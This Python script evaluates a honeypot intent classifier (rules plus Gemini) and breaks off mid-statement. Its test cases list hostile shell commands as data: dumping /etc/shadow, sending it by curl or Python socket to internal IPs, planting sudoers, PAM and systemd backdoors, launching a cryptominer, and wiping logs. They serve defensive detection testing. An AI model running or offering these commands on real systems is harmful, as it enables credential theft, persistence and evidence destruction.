#!/usr/bin/env python3
"""
==============================================================================
Phase 10 -- Unseen / Ambiguous Behaviour Evaluation
Intent-Aware Deception System for Real-Time Attacker Profiling
Version: v1.0 Release Candidate (FROZEN -- NO production code changes)
==============================================================================

DESIGN RATIONALE:
- Phase 9 showed 1.0000 accuracy on 42 cases derived from rule signatures.
- This script evaluates the SAME frozen classifier on 28 cases that do NOT
  directly map to existing rule patterns.
- The goal is to test whether the Gemini layer provides measurable value
  when deterministic rules are insufficient.

Gemini trigger conditions (from hybrid_classifier.py, line 58-66):
  should_query_gemini = (
      gemini_enabled
      AND has_command
      AND (rule_confidence < 0.90 OR rule_intent == OTHER)
  )

Rule confidence map (from rule_classifier.py RULES_CATALOG):
  0.95: CRED_02, EXEC_01, PERSIST_02
  0.92: PRIVESC_01, CLEAN_01, EXPLOIT_01
  0.90: PRIVESC_02, PERSIST_01
  0.88: RECON_01, EXEC_02, EXFIL_01
  0.85: DISC_01
  0.30: Default fallback (no match) -> OTHER
  --> Commands < 0.90 OR intent OTHER will invoke Gemini.

Unseen case design strategy:
  - Type A: Completely novel commands (no rule match) -> rule=OTHER,0.30 -> Gemini invoked
  - Type B: Commands that partially match a low-confidence rule -> rule correct but <0.90 -> Gemini invoked
  - Type C: Commands that match a rule for WRONG intent (known false positive territory)
  - Type D: Clearly benign/OTHER commands used as control cases

==============================================================================
"""

import csv
import json
import logging
import os
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

# -- Ensure project root on PYTHONPATH ----------------------------------------
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt
import numpy as np

from backend.app.models.events import NormalizedEvent
from backend.app.models.features import SessionFeatures
from backend.app.models.intent import AttackStage, IntentCategory
from backend.app.services.feature_extractor import FeatureExtractor
from backend.app.services.gemini_classifier import GeminiClassifier
from backend.app.services.hybrid_classifier import HybridClassifier
from backend.app.services.risk_engine import RiskEngine
from backend.app.services.rule_classifier import RuleClassifier

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger("phase10_eval")

# -- Output directory ---------------------------------------------------------
EVAL_DIR = PROJECT_ROOT / "docs" / "evaluation" / "unseen"
EVAL_DIR.mkdir(parents=True, exist_ok=True)

EVAL_TIMESTAMP = datetime.now(timezone.utc).isoformat()

# =============================================================================
# TASK 1 -- 28 UNSEEN / AMBIGUOUS TEST CASES
#
# Case types:
#   A: No rule match -> rule=OTHER,0.30 -> Gemini WILL be invoked
#   B: Partial rule match (low confidence <0.90) -> Gemini WILL be invoked
#   C: Rule matches WRONG intent (expected is different from rule output)
#   D: Control: benign/OTHER (should remain OTHER even after Gemini)
# =============================================================================
UNSEEN_CASES: List[Dict[str, Any]] = [

    # ===================================================================
    # CREDENTIAL_ACCESS - novel approaches not in rule signatures
    # ===================================================================
    {
        "test_id": "TC-U-CRED-01",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "[A] awk to read /etc/shadow fields - credential dump without cat",
        "case_type": "A",
        "event_type": "command_input",
        "command": "awk -F: '{print $1,$2}' /etc/shadow",
        "username": "root",
    },
    {
        "test_id": "TC-U-CRED-02",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "[A] john password cracker invocation - unseen tool",
        "case_type": "A",
        "event_type": "command_input",
        "command": "john --wordlist=/tmp/rockyou.txt /tmp/shadow_hashes.txt",
        "username": "root",
    },
    {
        "test_id": "TC-U-CRED-03",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "[A] Python script reading /etc/shadow directly",
        "case_type": "A",
        "event_type": "command_input",
        "command": "python3 -c \"print(open('/etc/shadow').read())\"",
        "username": "root",
    },
    {
        "test_id": "TC-U-CRED-04",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "[C] find *.pem -- matches RULE_DISC_01 but intent is credential theft",
        "case_type": "C",
        "event_type": "command_input",
        "command": "find / -name '*.pem' -o -name '*.key' 2>/dev/null",
        "username": "root",
    },

    # ===================================================================
    # RECONNAISSANCE - novel fingerprinting not in rule patterns
    # ===================================================================
    {
        "test_id": "TC-U-RECON-01",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "[A] cat /proc/version - kernel info via /proc not covered by RECON rule",
        "case_type": "A",
        "event_type": "command_input",
        "command": "cat /proc/version",
        "username": "root",
    },
    {
        "test_id": "TC-U-RECON-02",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "[A] systemctl list-units to enumerate running services",
        "case_type": "A",
        "event_type": "command_input",
        "command": "systemctl list-units --type=service --state=running",
        "username": "root",
    },
    {
        "test_id": "TC-U-RECON-03",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "[A] env - environment variable enumeration (reveals paths, user, tokens)",
        "case_type": "A",
        "event_type": "command_input",
        "command": "env",
        "username": "root",
    },
    {
        "test_id": "TC-U-RECON-04",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "[B] cat /proc/cpuinfo - partially matches DISC_01 proc/cpuinfo pattern",
        "case_type": "B",
        "event_type": "command_input",
        "command": "cat /proc/cpuinfo | grep -m1 'model name'",
        "username": "root",
    },

    # ===================================================================
    # DISCOVERY - novel enumeration tools not in signatures
    # ===================================================================
    {
        "test_id": "TC-U-DISC-01",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "[A] lsof -i - list open network sockets (not in RULE_DISC_01)",
        "case_type": "A",
        "event_type": "command_input",
        "command": "lsof -i -n -P",
        "username": "root",
    },
    {
        "test_id": "TC-U-DISC-02",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "[A] dpkg -l to enumerate installed packages",
        "case_type": "A",
        "event_type": "command_input",
        "command": "dpkg -l | grep -E 'ssh|ftp|nc|nmap'",
        "username": "root",
    },
    {
        "test_id": "TC-U-DISC-03",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "[A] df -h - disk space enumeration (not covered by any rule)",
        "case_type": "A",
        "event_type": "command_input",
        "command": "df -h",
        "username": "root",
    },
    {
        "test_id": "TC-U-DISC-04",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "[A] mount - enumerate filesystem mount points",
        "case_type": "A",
        "event_type": "command_input",
        "command": "mount | grep -v tmpfs",
        "username": "root",
    },

    # ===================================================================
    # EXECUTION - novel payload delivery patterns
    # ===================================================================
    {
        "test_id": "TC-U-EXEC-01",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "[A] chmod +x then run local file - no wget/curl dropper",
        "case_type": "A",
        "event_type": "command_input",
        "command": "chmod +x /tmp/update.sh && /tmp/update.sh",
        "username": "root",
    },
    {
        "test_id": "TC-U-EXEC-02",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "[A] PHP one-liner code execution via CLI",
        "case_type": "A",
        "event_type": "command_input",
        "command": "php -r 'system(\"id && cat /etc/passwd\");'",
        "username": "root",
    },
    {
        "test_id": "TC-U-EXEC-03",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "[A] nohup background execution of binary (cryptominer pattern)",
        "case_type": "A",
        "event_type": "command_input",
        "command": "nohup /tmp/.x/miner -o stratum+tcp://pool.xmrminerpro.com:8080 &",
        "username": "root",
    },

    # ===================================================================
    # PRIVILEGE_ESCALATION - novel PrivEsc patterns
    # ===================================================================
    {
        "test_id": "TC-U-PRIV-01",
        "expected_intent": IntentCategory.PRIVILEGE_ESCALATION,
        "expected_attack_stage": AttackStage.PRIVILEGE_ESCALATION,
        "scenario": "[A] chmod u+s on copied bash binary for SUID shell",
        "case_type": "A",
        "event_type": "command_input",
        "command": "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash",
        "username": "user",
    },
    {
        "test_id": "TC-U-PRIV-02",
        "expected_intent": IntentCategory.PRIVILEGE_ESCALATION,
        "expected_attack_stage": AttackStage.PRIVILEGE_ESCALATION,
        "scenario": "[A] echo into /etc/sudoers.d for passwordless sudo",
        "case_type": "A",
        "event_type": "command_input",
        "command": "echo 'hacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/hacker",
        "username": "user",
    },
    {
        "test_id": "TC-U-PRIV-03",
        "expected_intent": IntentCategory.PRIVILEGE_ESCALATION,
        "expected_attack_stage": AttackStage.PRIVILEGE_ESCALATION,
        "scenario": "[A] visudo invocation (not sudo -l or su)",
        "case_type": "A",
        "event_type": "command_input",
        "command": "visudo",
        "username": "user",
    },

    # ===================================================================
    # PERSISTENCE - novel mechanisms beyond cron / SSH keys
    # ===================================================================
    {
        "test_id": "TC-U-PERS-01",
        "expected_intent": IntentCategory.PERSISTENCE,
        "expected_attack_stage": AttackStage.PERSISTENCE,
        "scenario": "[A] PAM backdoor via pam_exec.so module",
        "case_type": "A",
        "event_type": "command_input",
        "command": "echo 'session optional pam_exec.so /tmp/payload.sh' >> /etc/pam.d/common-auth",
        "username": "root",
    },
    {
        "test_id": "TC-U-PERS-02",
        "expected_intent": IntentCategory.PERSISTENCE,
        "expected_attack_stage": AttackStage.PERSISTENCE,
        "scenario": "[A] systemd malicious service unit creation",
        "case_type": "A",
        "event_type": "command_input",
        "command": "printf '[Unit]\\nDescription=system update\\n[Service]\\nExecStart=/tmp/evil\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/sysupdate.service",
        "username": "root",
    },
    {
        "test_id": "TC-U-PERS-03",
        "expected_intent": IntentCategory.PERSISTENCE,
        "expected_attack_stage": AttackStage.PERSISTENCE,
        "scenario": "[A] MOTD persistence via /etc/update-motd.d symlink",
        "case_type": "A",
        "event_type": "command_input",
        "command": "ln -sf /tmp/backdoor.sh /etc/update-motd.d/99-evil",
        "username": "root",
    },

    # ===================================================================
    # EXFILTRATION - novel transfer patterns
    # ===================================================================
    {
        "test_id": "TC-U-EXFIL-01",
        "expected_intent": IntentCategory.EXFILTRATION,
        "expected_attack_stage": AttackStage.EXFILTRATION,
        "scenario": "[A] base64-encode /etc/shadow and curl-POST the encoded string",
        "case_type": "A",
        "event_type": "command_input",
        "command": "base64 /etc/shadow | curl -s -X POST -d @- http://10.0.0.99/collect",
        "username": "root",
    },
    {
        "test_id": "TC-U-EXFIL-02",
        "expected_intent": IntentCategory.EXFILTRATION,
        "expected_attack_stage": AttackStage.EXFILTRATION,
        "scenario": "[A] Python direct file read over socket (not reverse shell)",
        "case_type": "A",
        "event_type": "command_input",
        "command": "python3 -c \"import socket; s=socket.socket(); s.connect(('10.0.0.1',9999)); s.send(open('/etc/passwd','rb').read()); s.close()\"",
        "username": "root",
    },

    # ===================================================================
    # CLEANUP - novel anti-forensic methods
    # ===================================================================
    {
        "test_id": "TC-U-CLEAN-01",
        "expected_intent": IntentCategory.CLEANUP,
        "expected_attack_stage": AttackStage.CLEANUP,
        "scenario": "[A] symlink .bash_history to /dev/null (not rm or history -c)",
        "case_type": "A",
        "event_type": "command_input",
        "command": "ln -sf /dev/null ~/.bash_history",
        "username": "root",
    },
    {
        "test_id": "TC-U-CLEAN-02",
        "expected_intent": IntentCategory.CLEANUP,
        "expected_attack_stage": AttackStage.CLEANUP,
        "scenario": "[A] truncate auth.log and syslog to zero bytes",
        "case_type": "A",
        "event_type": "command_input",
        "command": "truncate -s0 /var/log/auth.log /var/log/syslog",
        "username": "root",
    },
    {
        "test_id": "TC-U-CLEAN-03",
        "expected_intent": IntentCategory.CLEANUP,
        "expected_attack_stage": AttackStage.CLEANUP,
        "scenario": "[A] sed to delete attacker IP lines from auth log",
        "case_type": "A",
        "event_type": "command_input",
        "command": "sed -i '/192.168.1.200/d' /var/log/auth.log",
        "username": "root",
    },

    # ===================================================================
    # CONTROL / OTHER - clearly benign (Gemini should confirm OTHER)
    # ===================================================================
    {
        "test_id": "TC-U-OTHER-01",
        "expected_intent": IntentCategory.OTHER,
        "expected_attack_stage": AttackStage.UNKNOWN,
        "scenario": "[D] echo hello - benign shell output",
        "case_type": "D",
        "event_type": "command_input",
        "command": "echo hello",
        "username": "root",
    },
    {
        "test_id": "TC-U-OTHER-02",
        "expected_intent": IntentCategory.OTHER,
        "expected_attack_stage": AttackStage.UNKNOWN,
        "scenario": "[D] date - benign date command",
        "case_type": "D",
        "event_type": "command_input",
        "command": "date",
        "username": "root",
    },
]


def make_event(case: Dict[str, Any]) -> NormalizedEvent:
    return NormalizedEvent(
        event_id=uuid.uuid4().hex[:24],
        timestamp=datetime.now(timezone.utc),
        session_id=f"unseen_{case['test_id'].replace('-', '_').lower()}",
        source_ip="127.0.0.1",
        source_port=54321,
        protocol="ssh",
        username=case.get("username"),
        event_type=case["event_type"],
        command=case.get("command"),
        raw_event={
            "eventid": f"cowrie.{case['event_type'].replace('_', '.')}",
            "input": case.get("command") or "",
            "username": case.get("username") or "",
        },
    )


def make_features(case: Dict[str, Any]) -> SessionFeatures:
    has_cmd = bool(case.get("command"))
    return SessionFeatures(
        session_id=f"unseen_{case['test_id'].replace('-', '_').lower()}",
        source_ip="127.0.0.1",
        protocol="ssh",
        username=case.get("username"),
        total_events=3 if has_cmd else 1,
        command_count=1 if has_cmd else 0,
        unique_commands=[case["command"]] if has_cmd else [],
        unique_command_count=1 if has_cmd else 0,
        login_attempt_count=1,
        login_success_count=1,
        login_failed_count=0,
        distinct_event_types_count=2,
        activity_rate=0.5,
        command_frequency=0.5 if has_cmd else 0.0,
    )


def accuracy_f1(y_true: List[str], y_pred: List[str]) -> Dict[str, Any]:
    """Compute per-class and aggregate metrics."""
    classes = sorted(set(y_true + y_pred))
    gt_classes = [c for c in classes if any(t == c for t in y_true)]
    per_class: Dict[str, Dict] = {}

    for cls in classes:
        tp = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p == cls)
        fp = sum(1 for t, p in zip(y_true, y_pred) if t != cls and p == cls)
        fn = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p != cls)
        support = sum(1 for t in y_true if t == cls)
        precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
        f1 = (2 * precision * recall / (precision + recall)) if (precision + recall) > 0 else 0.0
        per_class[cls] = {
            "tp": tp, "fp": fp, "fn": fn,
            "support": support,
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1": round(f1, 4),
        }

    n = len(y_true)
    accuracy = sum(1 for t, p in zip(y_true, y_pred) if t == p) / n if n > 0 else 0.0
    macro_p = sum(per_class[c]["precision"] for c in gt_classes) / len(gt_classes) if gt_classes else 0.0
    macro_r = sum(per_class[c]["recall"] for c in gt_classes) / len(gt_classes) if gt_classes else 0.0
    macro_f1 = sum(per_class[c]["f1"] for c in gt_classes) / len(gt_classes) if gt_classes else 0.0
    total_support = sum(per_class[c]["support"] for c in gt_classes)
    w_p = sum(per_class[c]["precision"] * per_class[c]["support"] for c in gt_classes) / total_support if total_support > 0 else 0.0
    w_r = sum(per_class[c]["recall"] * per_class[c]["support"] for c in gt_classes) / total_support if total_support > 0 else 0.0
    w_f1 = sum(per_class[c]["f1"] * per_class[c]["support"] for c in gt_classes) / total_support if total_support > 0 else 0.0

    return {
        "accuracy": round(accuracy, 4),
        "macro_precision": round(macro_p, 4),
        "macro_recall": round(macro_r, 4),
        "macro_f1": round(macro_f1, 4),
        "weighted_precision": round(w_p, 4),
        "weighted_recall": round(w_r, 4),
        "weighted_f1": round(w_f1, 4),
        "per_class": per_class,
        "classes": classes,
        "n": n,
    }


def build_confusion_matrix(y_true, y_pred, labels):
    idx = {l: i for i, l in enumerate(labels)}
    m = np.zeros((len(labels), len(labels)), dtype=int)
    for t, p in zip(y_true, y_pred):
        if t in idx and p in idx:
            m[idx[t]][idx[p]] += 1
    return m


def plot_cm(matrix, labels, title, path):
    short = [l.replace("_", "\n") for l in labels]
    fig, ax = plt.subplots(figsize=(11, 9))
    fig.patch.set_facecolor("#1a1a2e")
    ax.set_facecolor("#1a1a2e")
    im = ax.imshow(matrix, cmap="Blues", interpolation="nearest")
    plt.colorbar(im, ax=ax, fraction=0.046, pad=0.04)
    ax.set_xticks(range(len(labels)))
    ax.set_xticklabels(short, fontsize=7, color="white", rotation=45, ha="right")
    ax.set_yticks(range(len(labels)))
    ax.set_yticklabels(short, fontsize=7, color="white")
    thresh = matrix.max() / 2.0
    for i in range(len(labels)):
        for j in range(len(labels)):
            v = matrix[i, j]
            ax.text(j, i, str(v), ha="center", va="center",
                    color="white" if v < thresh else "#1a1a2e", fontsize=9, fontweight="bold")
    ax.set_ylabel("True Intent", color="white", fontsize=11)
    ax.set_xlabel("Predicted Intent", color="white", fontsize=11)
    ax.set_title(title, color="white", fontsize=11, pad=12)
    ax.tick_params(colors="white")
    for sp in ax.spines.values():
        sp.set_edgecolor("#4a4a6a")
    plt.tight_layout()
    plt.savefig(str(path), dpi=150, bbox_inches="tight", facecolor="#1a1a2e")
    plt.close(fig)
    print(f"  [+] Saved: {path.name}")


def warmup_gemini(clf: GeminiClassifier):
    """Attempt to pre-initialize the Gemini client before timing starts."""
    return clf._get_client()


# =============================================================================
# MAIN
# =============================================================================
def run_phase10():
    print("\n" + "=" * 72)
    print("  PHASE 10 -- UNSEEN / AMBIGUOUS BEHAVIOUR EVALUATION")
    print("  Intent-Aware Deception System v1.0 RC (FROZEN)")
    print(f"  Started: {EVAL_TIMESTAMP}")
    print("=" * 72)

    # -- Instantiate frozen classifiers (NO modification) ---------------------
    rule_clf = RuleClassifier()
    gemini_clf = GeminiClassifier()
    hybrid_clf = HybridClassifier(rule_classifier=rule_clf, gemini_classifier=gemini_clf)
    risk_engine = RiskEngine()

    # Pre-warm Gemini client (to exclude init overhead from timing)
    gemini_client = warmup_gemini(gemini_clf)
    gemini_api_available = gemini_client is not None
    print(f"\n[PRE-CHECK] Gemini API client initialized: {'YES' if gemini_api_available else 'NO (key missing or disabled)'}")
    print(f"[PRE-CHECK] Gemini enabled (config): {gemini_clf.enabled}")
    print(f"[PRE-CHECK] Total unseen cases: {len(UNSEEN_CASES)}")
    print(f"[PRE-CHECK] Case types breakdown:")
    for ct in ["A", "B", "C", "D"]:
        n = sum(1 for c in UNSEEN_CASES if c["case_type"] == ct)
        labels = {"A": "No rule match (Gemini primary)", "B": "Rule match <0.90 conf", "C": "Rule wrong intent", "D": "Control/benign"}
        print(f"  Type {ct} ({labels[ct]}): {n} cases")

    # -- TASK 2: Run frozen classifier on each case --------------------------
    print(f"\n[TASK 2] Running frozen v1.0 classifier on {len(UNSEEN_CASES)} unseen cases...")
    results: List[Dict[str, Any]] = []
    y_true: List[str] = []
    y_rule: List[str] = []
    y_hybrid: List[str] = []

    rule_latencies_ms: List[float] = []
    hybrid_latencies_ms: List[float] = []
    gemini_latencies_ms: List[float] = []

    for case in UNSEEN_CASES:
        event = make_event(case)
        features = make_features(case)
        exp_intent = case["expected_intent"].value
        exp_stage = case["expected_attack_stage"].value

        # Rule-only classification (timed)
        t0 = time.perf_counter()
        rule_result = rule_clf.classify(event, features)
        rule_latency = (time.perf_counter() - t0) * 1000
        rule_latencies_ms.append(rule_latency)

        # Predict whether Gemini should fire (mirrors hybrid logic)
        has_command = bool(event.command and event.command.strip())
        gemini_will_be_attempted = (
            gemini_clf.enabled
            and has_command
            and (
                rule_result.confidence < 0.90
                or rule_result.intent == IntentCategory.OTHER
            )
        )

        # Hybrid classification (timed; includes Gemini if applicable)
        t1 = time.perf_counter()
        hybrid_result = hybrid_clf.classify(event, features)
        hybrid_latency = (time.perf_counter() - t1) * 1000
        hybrid_latencies_ms.append(hybrid_latency)

        # Determine if Gemini was actually invoked and succeeded
        gemini_invoked = hybrid_result.source in ("GEMINI", "HYBRID")
        gemini_attempted = gemini_will_be_attempted  # Gemini was tried (may have failed)
        gemini_latency = hybrid_latency - rule_latency if gemini_attempted else None
        if gemini_latency is not None and gemini_latency > 0:
            gemini_latencies_ms.append(gemini_latency)

        # Risk evaluation
        risk = risk_engine.evaluate(event, hybrid_result, features)

        rule_intent = str(rule_result.intent)
        hybrid_intent = str(hybrid_result.intent)

        y_true.append(exp_intent)
        y_rule.append(rule_intent)
        y_hybrid.append(hybrid_intent)

        rule_correct = rule_intent == exp_intent
        hybrid_correct = hybrid_intent == exp_intent
        gemini_changed = rule_intent != hybrid_intent

        status_r = "PASS" if rule_correct else "FAIL"
        status_h = "PASS" if hybrid_correct else "FAIL"
        gemini_tag = "GEM-OK" if gemini_invoked else ("GEM-FAIL" if gemini_attempted else "RULE")

        print(f"  [{case['test_id']:16s}] Rule[{status_r}]:{rule_intent:22s} Hybrid[{status_h}]:{hybrid_intent:22s} [{gemini_tag}] Risk:{risk.risk_score:3d}")

        results.append({
            "test_id": case["test_id"],
            "case_type": case["case_type"],
            "scenario": case["scenario"],
            "event_type": case["event_type"],
            "command": case.get("command") or "",
            # Ground truth
            "expected_intent": exp_intent,
            "expected_attack_stage": exp_stage,
            # Rule-only
            "rule_intent": rule_intent,
            "rule_attack_stage": str(rule_result.attack_stage),
            "rule_confidence": rule_result.confidence,
            "rule_matched_ids": "|".join(rule_result.rule_matches),
            "rule_correct": rule_correct,
            # Gemini
            "gemini_attempted": gemini_attempted,
            "gemini_invoked_and_succeeded": gemini_invoked,
            "gemini_changed_prediction": gemini_changed,
            "gemini_latency_ms": round(gemini_latency, 4) if gemini_latency else "",
            # Hybrid final
            "hybrid_intent": hybrid_intent,
            "hybrid_attack_stage": str(hybrid_result.attack_stage),
            "hybrid_confidence": hybrid_result.confidence,
            "hybrid_source": str(hybrid_result.source),
            "hybrid_ai_reason": (hybrid_result.ai_reason or "")[:200],
            "hybrid_correct": hybrid_correct,
            # Risk
            "risk_score": risk.risk_score,
            "severity": str(risk.severity),
            # Latencies
            "rule_latency_ms": round(rule_latency, 4),
            "hybrid_latency_ms": round(hybrid_latency, 4),
        })

    # -- TASK 3: Gemini usage metrics ----------------------------------------
    total = len(results)
    gemini_attempted_count = sum(1 for r in results if r["gemini_attempted"])
    gemini_succeeded_count = sum(1 for r in results if r["gemini_invoked_and_succeeded"])
    gemini_changed_count = sum(1 for r in results if r["gemini_changed_prediction"])
    rule_resolved_count = total - gemini_attempted_count
    fallback_count = sum(1 for r in results if r["hybrid_source"] == "FALLBACK")

    print(f"\n[TASK 3] Gemini Usage Summary:")
    print(f"  Total cases          : {total}")
    print(f"  Rule-only resolved   : {rule_resolved_count} (Gemini not attempted)")
    print(f"  Gemini attempted     : {gemini_attempted_count} ({100*gemini_attempted_count/total:.1f}%)")
    print(f"  Gemini succeeded     : {gemini_succeeded_count}")
    print(f"  Gemini FALLBACK      : {fallback_count} (attempted but failed/unavailable)")
    print(f"  Changed predictions  : {gemini_changed_count}")

    # -- TASK 4: Classification metrics (A: Rule-only, B: Hybrid) -------------
    print("\n[TASK 4] Classification Metrics (A: Rule-only | B: Hybrid):")
    rule_metrics = accuracy_f1(y_true, y_rule)
    hybrid_metrics = accuracy_f1(y_true, y_hybrid)

    print(f"\n  {'Metric':<30} {'Rule-only':>10} {'Hybrid':>10}")
    print(f"  {'-'*52}")
    for k in ("accuracy", "macro_precision", "macro_recall", "macro_f1", "weighted_f1"):
        print(f"  {k:<30} {rule_metrics[k]:>10.4f} {hybrid_metrics[k]:>10.4f}")

    print(f"\n  NOTE: Dataset size is {total} cases. Metrics are illustrative,")
    print(f"  not statistically significant for production claims.")

    # -- TASK 5: Hybrid value analysis ----------------------------------------
    print("\n[TASK 5] Cases where Gemini was invoked:")
    gemini_value_cases = [r for r in results if r["gemini_attempted"]]
    for r in gemini_value_cases:
        status = "IMPROVED" if (not r["rule_correct"] and r["hybrid_correct"]) else \
                 "DEGRADED" if (r["rule_correct"] and not r["hybrid_correct"]) else \
                 "UNCHANGED"
        print(f"  {r['test_id']:18s} Expected:{r['expected_intent']:22s} Rule:{r['rule_intent']:22s} Hybrid:{r['hybrid_intent']:22s} [{r['hybrid_source']:8s}] -> {status}")

    # -- TASK 6: FP / FN analysis ---------------------------------------------
    fp_fn = [r for r in results if not r["hybrid_correct"]]
    print(f"\n[TASK 6] Incorrect hybrid classifications ({len(fp_fn)} errors):")
    if fp_fn:
        for r in fp_fn:
            gemini_helped = r["gemini_invoked_and_succeeded"] and r["rule_correct"] != r["hybrid_correct"]
            print(f"  {r['test_id']:18s} Expected:{r['expected_intent']:22s} Got:{r['hybrid_intent']:22s} Gemini_helped:{gemini_helped} Source:{r['hybrid_source']}")
    else:
        print("  None - all hybrid predictions correct.")

    # -- TASK 7: Latency measurement ------------------------------------------
    print("\n[TASK 7] Latency Measurements:")
    rule_avg = round(sum(rule_latencies_ms) / len(rule_latencies_ms), 4) if rule_latencies_ms else 0.0
    rule_min = round(min(rule_latencies_ms), 4)
    rule_max = round(max(rule_latencies_ms), 4)

    hybrid_avg = round(sum(hybrid_latencies_ms) / len(hybrid_latencies_ms), 4)
    hybrid_min = round(min(hybrid_latencies_ms), 4)
    hybrid_max = round(max(hybrid_latencies_ms), 4)

    # Gemini latency: measured only where Gemini was attempted (includes both success and fail)
    gemini_avg = round(sum(gemini_latencies_ms) / len(gemini_latencies_ms), 4) if gemini_latencies_ms else None
    gemini_min = round(min(gemini_latencies_ms), 4) if gemini_latencies_ms else None
    gemini_max = round(max(gemini_latencies_ms), 4) if gemini_latencies_ms else None

    print(f"  Rule avg/min/max     : {rule_avg} / {rule_min} / {rule_max} ms")
    print(f"  Hybrid avg/min/max   : {hybrid_avg} / {hybrid_min} / {hybrid_max} ms")
    print(f"  Gemini latency (attempted): {gemini_avg} ms avg | {gemini_latencies_ms and len(gemini_latencies_ms)} samples")
    print(f"  NOTE: Gemini client was pre-warmed before timing. Init overhead excluded.")

    # -- TASK 8: Write output files -------------------------------------------
    print("\n[TASK 8] Writing output files...")

    # (a) unseen_dataset.csv
    with open(EVAL_DIR / "unseen_dataset.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=[
            "test_id", "case_type", "expected_intent", "expected_attack_stage",
            "scenario", "event_type", "command"
        ])
        writer.writeheader()
        for case in UNSEEN_CASES:
            writer.writerow({
                "test_id": case["test_id"],
                "case_type": case["case_type"],
                "expected_intent": case["expected_intent"].value,
                "expected_attack_stage": case["expected_attack_stage"].value,
                "scenario": case["scenario"],
                "event_type": case["event_type"],
                "command": case.get("command") or "",
            })
    print(f"  [+] Saved: unseen_dataset.csv ({len(UNSEEN_CASES)} rows)")

    # (b) unseen_results.csv
    with open(EVAL_DIR / "unseen_results.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(results[0].keys()))
        writer.writeheader()
        writer.writerows(results)
    print(f"  [+] Saved: unseen_results.csv ({len(results)} rows)")

    # (c) latency_results.csv
    with open(EVAL_DIR / "latency_results.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["metric", "value", "unit", "note"])
        writer.writeheader()
        writer.writerows([
            {"metric": "rule_classification_avg", "value": rule_avg, "unit": "ms", "note": f"Over {total} cases"},
            {"metric": "rule_classification_min", "value": rule_min, "unit": "ms", "note": ""},
            {"metric": "rule_classification_max", "value": rule_max, "unit": "ms", "note": ""},
            {"metric": "hybrid_pipeline_avg", "value": hybrid_avg, "unit": "ms", "note": "Pre-warmed Gemini client"},
            {"metric": "hybrid_pipeline_min", "value": hybrid_min, "unit": "ms", "note": ""},
            {"metric": "hybrid_pipeline_max", "value": hybrid_max, "unit": "ms", "note": ""},
            {"metric": "gemini_invocation_avg", "value": gemini_avg or "N/A", "unit": "ms",
             "note": f"{len(gemini_latencies_ms)} invocation samples; includes both success and FALLBACK"},
            {"metric": "gemini_api_available", "value": gemini_api_available, "unit": "bool", "note": ""},
        ])
    print(f"  [+] Saved: latency_results.csv")

    # (d) Confusion matrices
    all_labels = sorted(set(y_true + y_rule + y_hybrid))
    cm_rule = build_confusion_matrix(y_true, y_rule, all_labels)
    cm_hybrid = build_confusion_matrix(y_true, y_hybrid, all_labels)
    plot_cm(cm_rule, all_labels, "Confusion Matrix -- Rule-Only (Phase 10 Unseen Cases)", EVAL_DIR / "confusion_matrix_rule.png")
    plot_cm(cm_hybrid, all_labels, "Confusion Matrix -- Hybrid Classifier (Phase 10 Unseen Cases)", EVAL_DIR / "confusion_matrix_hybrid.png")

    # (e) unseen_metrics.json
    # Per-class comparison
    per_class_comparison = {}
    for cls in set(y_true):
        r = rule_metrics["per_class"].get(cls, {})
        h = hybrid_metrics["per_class"].get(cls, {})
        per_class_comparison[cls] = {
            "support": r.get("support", 0),
            "rule_precision": r.get("precision", 0.0),
            "rule_recall": r.get("recall", 0.0),
            "rule_f1": r.get("f1", 0.0),
            "hybrid_precision": h.get("precision", 0.0),
            "hybrid_recall": h.get("recall", 0.0),
            "hybrid_f1": h.get("f1", 0.0),
        }

    # Hybrid value cases
    hybrid_value_detail = []
    for r in results:
        if r["gemini_attempted"]:
            hybrid_value_detail.append({
